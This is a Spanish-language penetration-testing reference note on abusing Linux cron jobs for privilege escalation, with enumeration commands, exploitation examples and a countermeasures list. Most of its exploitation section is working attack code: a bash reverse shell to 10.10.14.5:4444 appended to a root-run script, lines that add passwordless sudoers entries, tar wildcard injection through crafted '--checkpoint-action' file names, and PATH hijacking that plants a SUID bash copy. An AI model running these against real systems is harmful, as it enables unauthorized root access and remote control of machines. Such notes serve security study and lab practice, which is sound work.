# Abuso de Cron Jobs

## Descripción
Cron es el planificador de tareas de Linux que ejecuta comandos o scripts de forma periódica según las configuraciones definidas en crontabs. Cuando un cron job se ejecuta con privilegios elevados (típicamente root) y referencia scripts en directorios con permisos de escritura, utiliza wildcards sin sanitizar, o tiene dependencias modificables, un atacante puede inyectar código malicioso que se ejecutará con los privilegios del propietario del cron. Esta técnica es especialmente efectiva porque los cron jobs se ejecutan automáticamente sin intervención del usuario.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1053.003 (Scheduled Task/Job: Cron)
- **Plataforma**: Linux
- **Dificultad**: Intermedia

## Herramientas
- **crontab** (`-l`) — listar cron jobs del usuario actual
- **cat** / **ls** — inspeccionar `/etc/crontab`, `/etc/cron.d/`, `/var/spool/cron/`
- **pspy** (https://github.com/DominicBreuker/pspy) — monitorear procesos en ejecución sin privilegios para descubrir cron jobs ocultos
- **linPEAS** (`linpeas.sh`) — enumeración automatizada que identifica cron jobs vulnerables

## Comandos / Ejemplos

### Enumeración de cron jobs
```bash
# Listar cron jobs del usuario actual
crontab -l

# Inspeccionar cron jobs del sistema
cat /etc/crontab

# Revisar directorios de cron
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.monthly/
ls -la /etc/cron.weekly/

# Revisar cron jobs de otros usuarios (requiere permisos)
ls -la /var/spool/cron/crontabs/

# Monitorear procesos con pspy para descubrir cron jobs ocultos
./pspy64
# Resultado: observar procesos ejecutándose periódicamente como UID=0 (root)
```

### Explotación: script en directorio writable
```bash
# Si un cron job de root ejecuta un script en un directorio con permisos de escritura
# Ejemplo en /etc/crontab: * * * * * root /opt/scripts/backup.sh
# Verificar permisos del script
ls -la /opt/scripts/backup.sh

# Si el script es writable, inyectar reverse shell
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/scripts/backup.sh

# O añadir usuario al grupo sudo
echo 'echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> /opt/scripts/backup.sh
```

### Explotación: wildcard injection con tar
```bash
# Si un cron job ejecuta: tar czf /backup/backup.tar.gz *
# En el directorio donde se ejecuta el tar, crear archivos especiales

# Crear payload
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > privesc.sh
chmod +x privesc.sh

# Crear archivos que tar interpreta como opciones
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh privesc.sh"

# Cuando el cron ejecute tar con wildcard, estos archivos se interpretan como flags
# Resultado: privesc.sh se ejecuta como root
```

### Explotación: PATH hijacking en cron
```bash
# Si el cron job llama a un comando sin ruta absoluta
# Ejemplo en /etc/crontab: * * * * * root backup
# Y PATH incluye un directorio writable antes de /usr/bin

# Crear binario malicioso en directorio con prioridad en PATH
echo '#!/bin/bash' > /usr/local/bin/backup
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /usr/local/bin/backup
chmod +x /usr/local/bin/backup

# Esperar ejecución del cron, luego:
/tmp/rootbash -p
```

## Contramedidas
- Usar rutas absolutas en todos los comandos dentro de scripts ejecutados por cron
- Evitar wildcards (`*`) en comandos cron; usar rutas explícitas en su lugar
- Asegurar que los scripts ejecutados por cron pertenezcan a root con permisos `755` o más restrictivos
- Verificar que los directorios padre de los scripts no sean escribibles por usuarios sin privilegios
- Definir explícitamente la variable `PATH` dentro de `/etc/crontab` con solo directorios confiables
- Monitorear cambios en archivos de configuración cron con herramientas de integridad (AIDE, OSSEC)

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1053.003: Scheduled Task/Job: Cron. https://attack.mitre.org/techniques/T1053/003/
- DominicBreuker. (s.f.). *pspy* [Software]. GitHub. https://github.com/DominicBreuker/pspy
- OccupyTheWeb. (2018). *Linux Basics for Hackers*. No Starch Press.
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- Notas del proyecto: notas-md/HNotes/HNotes/Hacking/Privilege Escalation.md
